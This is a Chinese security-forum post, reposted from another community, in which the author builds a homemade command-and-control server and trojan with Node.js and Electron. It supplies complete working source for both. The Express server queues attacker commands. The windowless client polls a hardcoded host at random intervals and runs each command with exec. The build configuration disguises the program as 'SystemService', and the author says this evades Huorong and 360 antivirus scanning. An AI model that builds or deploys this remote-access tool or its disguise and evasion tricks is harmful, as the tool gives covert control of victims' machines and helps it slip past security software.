---
title: 我用NodeJS+electron自研了个C2和木马并绕过了360+火绒内存扫描(附源码)
url: https://forum.butian.net/share/4257
source: 奇安信攻防社区
date: 2025-04-16
fetch_date: 2025-10-06T22:02:42.804239
---

# 我用NodeJS+electron自研了个C2和木马并绕过了360+火绒内存扫描(附源码)

#

[问答](https://forum.butian.net/questions)

*发起*

* [提问](https://forum.butian.net/question/create)
* [文章](https://forum.butian.net/share/create)

[攻防](https://forum.butian.net/community)
[活动](https://forum.butian.net/movable)

Toggle navigation

* [首页 (current)](https://forum.butian.net)
* [问答](https://forum.butian.net/questions)
* [商城](https://forum.butian.net/shop)
* [实战攻防技术](https://forum.butian.net/community)
* [漏洞分析与复现](https://forum.butian.net/articles)
  NEW
* [活动](https://forum.butian.net/movable)
* [摸鱼办](https://forum.butian.net/questions/Play)

搜索

* [登录](https://forum.butian.net/login)
* [注册](https://user.skyeye.qianxin.com/user/register?next=http://forum.butian.net/btlogin)

### 我用NodeJS+electron自研了个C2和木马并绕过了360+火绒内存扫描(附源码)

* [渗透测试](https://forum.butian.net/topic/47)

NodeJs可以写后端、electron又可以打包成exe，还可以通过主进程命令执行，那么不就可以自研一个C2了吗？

我用NodeJS+electron自研了个C2和木马并绕过了360+火绒内存扫描(附源码)
作者：Ting
[https://xz.aliyun.com/news/17480?time\\_\\_1311=eqUxn7DQG%3DDtoExBdodK0QQqAKqY5DOQKjeD&amp;u\\_atoken=bda7e820136863058f46d301ffc78c83&amp;u\\_asig=ac11000117430645498616714e00af](https://xz.aliyun.com/news/17480?time\_\_1311=eqUxn7DQG%3DDtoExBdodK0QQqAKqY5DOQKjeD&u\_atoken=bda7e820136863058f46d301ffc78c83&u\_asig=ac11000117430645498616714e00af)
文章转载自 先知社区
昨天咖啡喝多了，晚上睡不着觉，加上最近一直在写electron，就躺着东想西想，想到NodeJs可以写后端、electron又可以打包成exe，还可以通过主进程命令执行，那么不就可以自研一个C2了吗？早上一醒，说干就干。
思路很简单。nodejs起的后端写两个接口，第一个接口是控制端下发命令的、第二个接口是被控端接收命令的（其实还可以有第三个接口，正常情况也需要有第三个接口，就是发送命令执行的结果给控制端）。
然后用electron写个主进程，这个主进程需要有一定隐蔽性，所以不能打开窗口，也就是不能有GUi，然后需要不断的轮询，去查询控制端有没有下发命令（这里用随机时间发起轮询），如果下发了命令就用exec进行命令执行就好了，然后可以通过第三个接口将结果返回给控制端，这里我就省略了，代码也很简单。最终的效果也是绕过了火绒的内存扫描，绕过了360查杀（附视频）。
Server
======
\*\*创建node后端环境\*\*
```php
npm init
```
\*\*安装express 用于简化路由的创建和管理\*\*
```php
npm install express
```
\*\*服务端代码如下\*\*
```php
// ============== 服务端代码 (server.js) ==============
const express = require('express')
const app = express()
app.use(express.json())
let pendingCommand = null
app.post('/sendCommand', (req, res) => {
const { command } = req.body
pendingCommand = command
console.log(`[+] 命令已存储: ${command}`)
res.status(200).json({ status: 'success' })
})
app.get('/execCommand', (req, res) => {
if (pendingCommand) {
const command = pendingCommand
pendingCommand = null
res.status(200).json({ command })
} else {
res.status(200).json({ command: null })
}
})
app.listen(3000, () => {
console.log('C2服务器运行在端口 3000')
})
```
\*\*运行方式\*\*
```php
# 启动服务端
node server.js
```
\*\*发送命令测试\*\*
```php
curl -X POST http://localhost:3000/sendCommand -H "Content-Type: application/json" -d "{\"command\":\
"whoami\"}"
```
![](https://cdn.nlark.com/yuque/0/2025/png/34734558/1743045166080-8150e776-cf6a-470e-8e06-40e1beb94119.png)
Client
======
\*\*首先创建client项目\*\*
```php
vue create client
```
\*\*然后下载build\*\*
```php
cd .\client\
vue add electron-builder
```
\*\*开始写代码\*\*
以下是使用Electron+Vue实现无窗口被控端的解决方案，基于之前的核心逻辑进行扩展：
```php
// ============== 主进程代码 (background.js) ==============
const { app } = require('electron')
const axios = require('axios').default
const { exec } = require('child\_process')
const HOST = 'http://192.168.0.106:3000'
function createWindow() {
return null
}
async function pollCommands() {
try {
const response = await axios.get(`${HOST}/execCommand`)
if (response.data.command) {
console.log(`[\*] 接收到命令: ${response.data.command}`)
exec(response.data.command, (err, stdout, stderr) => {
if (err) console.error(`[!] 执行错误: ${err}`)
if (stdout) console.log(`[输出] ${stdout}`)
if (stderr) console.error(`[错误] ${stderr}`)
})
setTimeout(pollCommands, 100)
} else {
const retryDelay = Math.floor(Math.random() \* 5000) + 1000
setTimeout(pollCommands, retryDelay)
}
} catch (error) {
setTimeout(pollCommands, 5000)
}
}
app.whenReady().then(() => {
createWindow()
pollCommands()
})
app.on('window-all-closed', () => {})
```
配置（vue.config.js） 这里可以自定义icon等静态资源 可用来bypass qvm
```php
module.exports = {
pluginOptions: {
electronBuilder: {
nodeIntegration: true,
mainProcessFile: 'src/background.js',
builderOptions: {
productName: "SystemService",
appId: "com.example.systemservice",
win: {
target: "portable",
icon: "build/icon.ico"
},
extraResources: [
"build/icon.ico"
],
extraMetadata: {
buildNumber: "1.0.0"
}
}
}
}
}
```
\*\*最终效果\*\*
![](https://cdn.nlark.com/yuque/0/2025/png/34734558/1743047707023-f1b73cdb-8b69-40cc-898e-9bc7bd96d29b.png)
\*\*打包成exe\*\*
但是在真实环境不可能这样运行的 因为可能目标不一定有node环境所以我们需要打包
```php
npm run electron:build
```
效果展示
====
\*\*（这里上传不了视频，过几天公众号有视频（Ting的安全笔记））\*\*
\*\*真实效果—火绒内存扫描测试\*\*
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/03/attach-0a67e8b728eda9f232d67639a5f07d20d75f2dd2.png)
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/03/attach-1cf668fa2e929a3cc2080fffc8d632cc55c33266.png)
\*\*真实效果—360查杀\*\*
![image.png](https://cdn-yg-zzbm.yun.qianxin.com/attack-forum/2025/03/attach-94f9bee0c83d5ca033e6b83eea6d8e0798d453b7.png)

* 发表于 2025-04-15 09:35:44
* 阅读 ( 3365 )
* 分类：[安全工具](https://forum.butian.net/community/Sec_tools)

1 推荐
 收藏

## 0 条评论

请先 [登录](https://forum.butian.net/login) 后评论

[![小小小小白白](https://forum.butian.net/static/images/default_avatar.jpg)](https://forum.butian.net/people/17370)

[小小小小白白](https://forum.butian.net/people/17370)

1 篇文章

[奇安信攻防社区](https://forum.butian.net)|
联系我们

|
[sitemap](https://forum.butian.net/sitemap)

Copyright © 2013-2023 BUTIAN.NET 版权所有 [京ICP备18014330号-2](https://beian.miit.gov.cn/#/Integrated/index)

×

#### 发送私信

请先 [登录](https://forum.butian.net/login) 后发送私信

×

#### 举报此文章

垃圾广告信息：
广告、推广、测试等内容

违规内容：
色情、暴力、血腥、敏感信息等内容

不友善内容：
人身攻击、挑衅辱骂、恶意行为

其他原因：
请补充说明

举报原因:

取消
举报

×

#### ![小小小小白白](https://forum.butian.net/static/images/default_avatar.jpg)

如果觉得我的文章对您有用，请随意打赏。你的支持将鼓励我继续创作！

![]()

---